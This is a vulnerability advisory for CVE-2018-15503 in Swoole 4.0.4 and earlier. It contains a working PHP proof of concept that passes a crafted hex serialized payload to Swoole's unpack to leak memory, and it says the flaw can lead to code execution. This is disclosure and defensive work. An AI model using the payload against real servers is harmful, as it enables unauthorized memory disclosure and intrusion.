# CVE-2018-15503: Memory corruption via deserialization in Swoole
[![](https://img.shields.io/badge/Attack%20Vector-Remote-red?style=flat-square)]() [![](https://img.shields.io/badge/Privileges%20Required-None-red?style=flat-square)]() [![](https://img.shields.io/badge/User%20Interaction-No-red?style=flat-square)]()

__Vendor:__ Swoole<br>
__Vendor URL:__ https://www.swoole.co.uk<br>
__Versions affected:__ Swoole <= 4.0.4<br>
__Discovered by:__ Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/thexc3ll))<br>
__Public fix:__ Yes<br>
__Proof of Concept:__ Yes ([ref](https://github.com/X-C3LL/PoC-CVEs/tree/master/CVE-2018-15503))<br>
## Summary
The unpack implementation in Swoole version 4.0.4 lacks correct size checks in the deserialization process. An attacker can craft a serialized object to exploit this vulnerability and cause a memory corruption.

## Details
Proof of concept to leak 255 bytes:

```php
<?php
	$data = "e802ea7b02ea7b02227b0a010800737464436c617373018b0470726f7037ff0a010800737464436c617373018fc10037130a010800737464436c617373018ff1003713454f46";
	$obj = new \Swoole\Serialize();
	$sor = hex2bin($data);
	$ser = $obj->unpack($sor);
	echo "[+] Swoole Unserialized:\n";
	var_dump($ser);
	echo "[+] Memory Leaked:\n";
	$keys = key(get_object_vars($ser[1]));
	echo bin2hex($keys);
	echo "\n[+] Size: \n";
	echo strlen($keys);
?>
```
## Impact
This vulnerability can be abused to bypass server mitigations and execute arbitrary code.

## Recommendation
Update to last version.

## Timeline
* 14/08/2018 - Reported vulnerability to vendor
* 15/08/2018 - Fix released in Github

#

[![](https://img.shields.io/badge/www-blackarrow.net-E5A505?style=flat-square)](https://www.blackarrow.net) [![](https://img.shields.io/badge/twitter-@BlackArrowSec-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/BlackArrowSec) [![](https://img.shields.io/badge/linkedin-@BlackArrowSec-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/company/blackarrowsec/)
